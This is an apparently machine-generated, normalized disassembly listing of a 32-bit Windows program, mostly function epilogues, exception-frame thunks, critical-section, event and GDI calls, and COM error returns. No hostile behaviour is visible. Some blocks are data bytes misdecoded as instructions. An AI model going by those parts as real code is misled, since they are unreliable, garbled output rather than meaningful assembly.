mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419b8f
jmp sub_403a0c
sub_419b96
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419c4c
jmp sub_403a0c
sub_419c53
pop esi
pop ecx
pop ebp
retn
sub_419cd8
jmp sub_403a0c
sub_419cdf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419cfc
lea eax [ ebp - 0x8 ]
call sub_404008
retn
sub_419cf5
jmp sub_403a0c
sub_419cfc
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_419d88
jmp sub_403a0c
sub_419da5
jmp sub_403a0c
sub_419dac
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_419de8
retn
sub_419e6b
jmp sub_403a0c
sub_419e72
mov eax [ ebp - 0x8 ]
call sub_41ca58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419e97
lea eax [ ebp - 0xc ]
call sub_404008
retn
sub_419e90
jmp sub_403a0c
sub_419e97
mov esp ebp
pop ebp
retn
sub_419ee7
jmp sub_403a0c
sub_419eee
pop esi
pop ecx
pop ebp
retn
sub_419f41
jmp sub_403a0c
sub_419f48
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419f50
retn
sub_419fcb
jmp sub_403a0c
sub_419fd2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a06f
jmp sub_403a0c
sub_41a076
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a093
lea eax [ ebp - 0x8 ]
call sub_404008
retn
sub_41a08c
jmp sub_403a0c
sub_41a093
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a098
retn
sub_41a138
jmp sub_403a0c
sub_41a13f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a1be
jmp sub_403a0c
sub_41a1c5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a1cc
mov eax edx
mov edx ecx
call sub_407ec0
retn
sub_41a1d8
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_41a1f0
sub_41a268
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_41a2d8
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_41a2f4
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41a4e8
mov eax [ eax + 0x18 ]
retn
sub_41a4ec
mov eax [ eax + 0x14 ]
retn
sub_41a588
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_41a794
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_40270c
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_41a7d0
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_41a7e8
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_41a7fc
mov edx sub_41a7e8
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_41a844
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_407ec0
retn
mov eax edx
mov edx ecx
call sub_407e88
retn
sub_41a8e0
retn
sub_41abd8
jmp sub_403a0c
sub_41abdf
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41ac40
jmp sub_403a0c
sub_41ac47
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ac8c
mov eax [ eax + 0x4 ]
call sub_408438
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41ac9c
mov eax [ eax + 0x4 ]
call sub_408464
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41acd8
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_41ae81
jmp sub_403a0c
sub_41aee0
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_41af70
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41afc0
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_41b1ab
jmp sub_403a0c
sub_41b1b2
mov esp ebp
pop ebp
retn
sub_41b25c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
retn
sub_41b2e4
mov [ eax + 0x18 ] edx
retn
sub_41b460
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_414998
retn
sub_41b4e7
jmp sub_403a0c
sub_41b4ee
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b59a
jmp sub_403a0c
sub_41b5a1
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b745
jmp sub_403a0c
sub_41b797
jmp sub_403a0c
sub_41b7b6
jmp sub_403a0c
sub_41b7bd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b7dc
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41b7d5
jmp sub_403a0c
sub_41b7dc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b87f
jmp sub_403a0c
sub_41b907
jmp sub_403a0c
sub_41b914
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
pop ebx
retn
sub_41b92c
mov eax [ rw-data ]
call sub_41b914
retn
sub_41b964
push ebx
call sub_4147cc
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41b92c
sub_41bad1
jmp sub_403a0c
sub_41bad8
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_404008
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_41bbf8
jmp sub_403a0c
sub_41bbff
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41bcf6
jmp sub_403a0c
sub_41bd13
jmp sub_403a0c
sub_41bd1a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41be18
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41a860
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_41bedc
push ebx
mov ebx eax
mov eax ebx
call sub_41d890
cmp al 0x9
sete al
pop ebx
retn
sub_41bf3b
jmp sub_403a0c
sub_41bf42
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41bfe8
jmp sub_403a0c
sub_41bfef
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c26e
jmp sub_403758
sub_41c29a
jmp sub_403758
sub_41c33c
jmp sub_403758
sub_41c3df
jmp sub_403758
sub_41c5b7
jmp sub_403758
sub_41c5f9
jmp sub_403a0c
sub_41c629
jmp sub_403a0c
sub_41c630
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c69f
jmp sub_403a0c
sub_41c776
jmp sub_403a0c
sub_41c77d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ca50
mov dl 0x1
call sub_41b9b8
retn
sub_41cb88
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_41cb91
jmp sub_403a0c
j_sub_41cb88
jmp sub_41cb88
sub_41cb98
pop ebx
mov esp ebp
pop ebp
retn
sub_41cba0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41d9a0
mov eax [ rw-data ]
call sub_41b914
pop ebp
retn
j_sub_403884
jmp sub_403884
j_sub_403884#2
jmp sub_403884
sub_41cd8c
jmp sub_403a0c
sub_41cd93
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ce73
jmp sub_403a0c
sub_41ce7a
mov esp ebp
pop ebp
retn
sub_41cf32
jmp sub_403a0c
sub_41cf39
pop ecx
pop ecx
pop ebp
retn
sub_41d23b
jmp sub_403a0c
sub_41d242
pop ebx
mov esp ebp
pop ebp
retn
sub_41d4e7
jmp sub_403a0c
sub_41d4ee
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_403290
retn
sub_41d507
jmp sub_403a0c
sub_41d52b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_403758
sub_41d562
jmp sub_403758
sub_41d5a1
jmp sub_403a0c
sub_41d5a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d5ca
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_40402c
retn
sub_41d5c3
jmp sub_403a0c
sub_41d5ca
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d651
jmp sub_403758
sub_41d67e
jmp sub_403a0c
sub_41d685
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d690
push ecx
mov edx esp
mov ecx 0x4
call sub_41be54
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_41b914
sub_41d79d
jmp sub_403a0c
sub_41d7a4
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d883
jmp sub_403a0c
sub_41d88a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d8e0
jmp sub_403a0c
sub_41d8e7
pop ebx
pop ecx
pop ebp
retn
sub_41db2f
jmp sub_403a0c
sub_41db36
pop ecx
pop ecx
pop ebp
retn
sub_41db79
jmp sub_403a0c
sub_41db80
pop ebx
pop ecx
pop ebp
retn
sub_41dc1c
jmp sub_403a0c
sub_41dc23
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41dcd1
jmp sub_403a0c
sub_41dcd8
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41dce4
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_41df3f
jmp sub_403a0c
sub_41df46
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41df6b
mov eax [ ebp - 0x8 ]
call sub_403290
mov eax [ ebp - 0x4 ]
call sub_403290
retn
sub_41df64
jmp sub_403a0c
sub_41df6b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41df90
lea eax [ ebp - 0x1c ]
call sub_405874
lea eax [ ebp - 0x18 ]
call sub_404008
retn
sub_41df89
jmp sub_403a0c
sub_41df90
pop ebx
mov esp ebp
pop ebp
retn
sub_41e1a2
jmp sub_403a0c
sub_41e1a9
pop ebx
mov esp ebp
pop ebp
retn
sub_41e1dc
mov eax [ eax + 0x30 ]
call sub_4181b4
retn
sub_41e24c
call sub_41e37c
retn
sub_41e290
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41b2e4
mov [ ebx + 0x1c ] esi
pop esi
pop ebx
retn
sub_41e36b
jmp sub_403a0c
sub_41e372
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41e37c
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_41aac4
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_41e394
test dl dl
je r-xdata
mov dl 0x8
call sub_4204c8
retn
mov dl 0x9
call sub_4204c8
retn
sub_41e3eb
jmp sub_403a0c
sub_41e3f2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41e48a
jmp sub_403a0c
sub_41e491
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41e62f
jmp sub_403a0c
sub_41e636
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e977
jmp sub_403a0c
sub_41e9b9
jmp sub_403a0c
sub_41ea18
jmp sub_403a0c
sub_41ea1f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ec5c
mov dl 0x1
call sub_4204c8
retn
sub_41ec64
xor edx edx
call sub_4204c8
retn
sub_41ed5d
jmp sub_403a0c
sub_41ef33
jmp sub_403a0c
sub_41ef3a
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f108
jmp sub_403a0c
sub_41f10f
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f1e5
jmp sub_403a0c
sub_41f1ec
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41f303
jmp sub_403a0c
sub_41f30a
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41f4c4
jmp sub_403a0c
sub_41f4cb
pop ecx
pop ebp
retn
sub_41f556
jmp sub_403a0c
sub_41f55d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41f5c4
jmp sub_403a0c
sub_41f5cb
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41f649
jmp sub_403a0c
sub_41f650
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f66d
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_41f666
jmp sub_403a0c
sub_41f66d
pop ebx
pop ecx
pop ebp
retn
sub_41f728
jmp sub_403a0c
sub_41f72f
pop ebx
pop ecx
pop ebp
retn
sub_41f805
jmp sub_403a0c
sub_41f80c
pop ecx
pop ebp
retn
sub_41f810
mov cl 0x1
test eax eax
je r-xdata
xor ecx ecx
cmp edx eax
je r-xdata
mov eax ecx
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
sub_41f917
jmp sub_403a0c
sub_41f91e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41fac5
jmp sub_403a0c
sub_41fb44
jmp sub_403a0c
sub_41fb4b
mov esp ebp
pop ebp
retn
sub_41fc19
jmp sub_403a0c
sub_41fc20
pop ebx
mov esp ebp
pop ebp
retn
sub_41fcd3
jmp sub_403a0c
sub_41fcda
pop ebx
mov esp ebp
pop ebp
retn
sub_41fd39
jmp sub_403a0c
sub_41fd40
mov esp ebp
pop ebp
retn
sub_4201a5
jmp sub_403a0c
sub_4201ff
jmp sub_403a0c
sub_420210
jmp sub_403758
sub_42026c
jmp sub_403a0c
sub_420273
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4202d2
jmp sub_403a0c
sub_4202d9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_420405
jmp sub_403a0c
sub_42040c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4204ba
jmp sub_403a0c
sub_4204c1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420500
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40cb14
sub_420534
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_42054c
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_420558
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_42054c
sub_42067e
jmp sub_403758
sub_4206ad
jmp sub_403a0c
sub_4206e3
jmp sub_403a0c
sub_4206ea
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420709
push rw-data
call LeaveCriticalSection
retn
sub_420702
jmp sub_403a0c
sub_420709
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4207d8
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_4209b4
sub_420838
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41c9a0
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_42084c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41c9a0
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_420860
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41eb90
retn
sub_42086c
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41eb90
retn
sub_420b14
xor eax eax
retn
sub_420b18
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_420b20
xor eax eax
retn
sub_420b24
retn
sub_420b28
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40405c
pop esi
pop ebx
retn
sub_420b3c
mov eax [ eax + 0x4 ]
retn
sub_420b40
retn
sub_420b44
xor eax eax
retn
sub_420b48
retn
sub_420b4c
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_420b58
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_420b64
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_420b70
retn
sub_420b74
xchg edx eax
call sub_41c644
retn
sub_420b7c
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_420c04
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_40348c
pop esi
retn
sub_420c18
retn
sub_420cf8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_40405c
pop esi
pop ebx
retn
sub_420d38
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_420e9c
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_420f24
retn
sub_420f6c
retn
sub_420fa4
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_420fbc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_4211e0
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_40348c
pop esi
pop ebx
retn
sub_421004
mov al 0x1
retn
sub_421008
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_421010
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_4210b8
xor eax eax
retn
sub_4210bc
retn
sub_4210e8
retn
sub_421180
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_421194
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_4181b4
retn
sub_4212db
jmp sub_403758
sub_4212e0
mov ebx 0x1
call sub_403ac0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421343
jmp sub_403758
sub_421348
mov ebx 0x80030103
call sub_403ac0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_4213c6
jmp sub_403758
sub_4213cb
mov ebx 0x80030009
call sub_403ac0
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_421429
jmp sub_403758
sub_42142e
mov ebx 0x8000ffff
call sub_403ac0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_4215f9
jmp sub_403a0c
sub_42160a
jmp sub_403758
sub_42160f
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403ac0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421638
lea eax [ ebp + 0xc ]
call sub_405874
retn
sub_421631
jmp sub_403a0c
sub_421638
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_421644
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_421650
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_42165c
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_421668
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_4216d7
jmp sub_403758
sub_4216dc
mov esi 0x8000ffff
call sub_403ac0
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_4216f0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_42175d
jmp sub_403a0c
sub_421764
mov eax [ rw-data ]
call sub_403290
pop edi
pop esi
pop ebx
pop ebp
retn
sub_421774
call sub_4178f8
retn
sub_42183c
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_4219e0
jmp sub_403a0c
sub_4219e7
pop ebp
retn
sub_421a75
jmp sub_403a0c
sub_421a7c
pop ebp
retn
sub_421d4d
jmp sub_403a0c
sub_421d54
pop ebp
retn
sub_421d58
sub [ rw-data ] 0x1
retn
sub_4226b9
sub al [ eax ]
inc esp
pushad
inc edx
add [ eax + 0x60 ] cl
inc edx
add ah cl
sub al [ eax ]
enter 0x4260 0x0
int3
sub_422a10
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_422a84
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_422af8
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_422b04
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_422be4
jmp sub_403a0c
sub_422beb
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_422c7b
jmp sub_403a0c
sub_422d0d
jmp sub_403a0c
sub_422d14
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_422d78
jmp sub_403a0c
sub_422d7f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_422de7
jmp sub_403a0c
sub_422dee
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_422e91
jmp sub_403a0c
sub_422e98
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423338
push 0x33
mov ecx rw-data
call sub_417c34
retn
sub_423348
push 0x33
mov ecx rw-data
call sub_417bf4
retn
sub_423358
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_42337c
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_423550
push 0x11
mov ecx rw-data
call sub_417bf4
retn
sub_423690
push ebx
mov ebx eax
mov eax ebx
call sub_423358
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_42374a
jmp sub_403a0c
sub_423751
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_42337c
retn
sub_423767
jmp sub_403a0c
sub_423780
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_4237dd
jmp sub_403a0c
sub_4237e4
pop ebx
pop ecx
pop ebp
retn
sub_42395d
jmp sub_403a0c
sub_423985
jmp sub_403a0c
sub_42398c
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4239f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_40426c
pop esi
pop ebx
retn
sub_423a6c
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_4239c8
push eax
call MulDiv
neg eax
pop ebx
retn
sub_423aa8
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_423ae0
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_423b10
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_423c2e
jmp sub_403a0c
sub_423c35
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_42337c
retn
sub_423c4b
jmp sub_403a0c
sub_423cc1
jmp sub_403a0c
sub_423cc8
pop ebx
pop ecx
pop ebp
retn
sub_423ccc
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_423d82
jmp sub_403a0c
sub_423d94
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_40348c
sub_423da8
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_423ee7
jmp sub_403a0c
sub_423eee
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_42337c
retn
sub_423f04
jmp sub_403a0c
sub_423f7d
jmp sub_403a0c
sub_423f84
pop ebx
pop ecx
pop ebp
retn
sub_4240b5
jmp sub_403a0c
sub_4240c8
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_424450
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_42479c
jmp sub_403a0c
sub_4247a3
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_4247ac
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_4247e4
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4247f0
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_424930
retn
sub_4249f9
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_424a10
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_424afc
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424b1c
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424b3c
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424b5c
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
pop ebx
retn
sub_424b74
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
pop ebx
retn
sub_424b98
mov eax [ rw-data ]
call sub_424b74
retn
sub_424bee
jmp sub_403a0c
sub_424bf5
pop ecx
pop ebp
retn
sub_424c94
jmp sub_403a0c
sub_424c9b
pop ebx
mov esp ebp
pop ebp
retn
sub_424d6d
jmp sub_403a0c
sub_424dfe
jmp sub_403a0c
sub_424e05
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424e30
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_424f17
jmp sub_403a0c
sub_4250c4
jmp sub_403a0c
sub_4250cb
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_4252dd
jmp sub_403a0c
